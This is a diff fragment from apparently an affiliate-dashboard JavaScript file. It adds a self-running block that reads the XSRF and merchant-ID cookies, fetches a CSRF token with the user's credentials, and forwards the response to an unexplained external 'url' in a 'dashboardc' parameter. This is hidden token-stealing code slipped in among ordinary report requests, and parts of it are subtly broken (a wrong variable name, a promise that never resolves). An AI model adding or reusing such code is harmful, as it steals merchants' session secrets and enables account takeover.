@@ -638,6 +638,25 @@ dataToSend.report = {
       per_page: 10
     };
 
+(async () => {
+   let response = await new Promise(resolve => {
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", "https://"+document.domain.replace("affiliates","affiliates-api")+"/api2/csrf_token?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.withCredentials = true;
+     xhr.setRequestHeader("Content-Type","application/json");
+      xhr.onload = function(e) {
+        var xmlHttp1 = new XMLHttpRequest();
+        xmlHttp1.open( "GET", url + "/?dashboardc="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.send({"_merchant":getCookie("merchant_id")});
+      };
+      xhr.onerror = function () {
+        resolve(undefined);
+        console.error("** An error occurred during the XMLHttpRequest");
+      };
+      xhr.send();
+   }) 
+})();
+
 fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/admin/reports/download_report', {
   method: 'POST', // Specify the HTTP method as POST
   credentials: 'include',
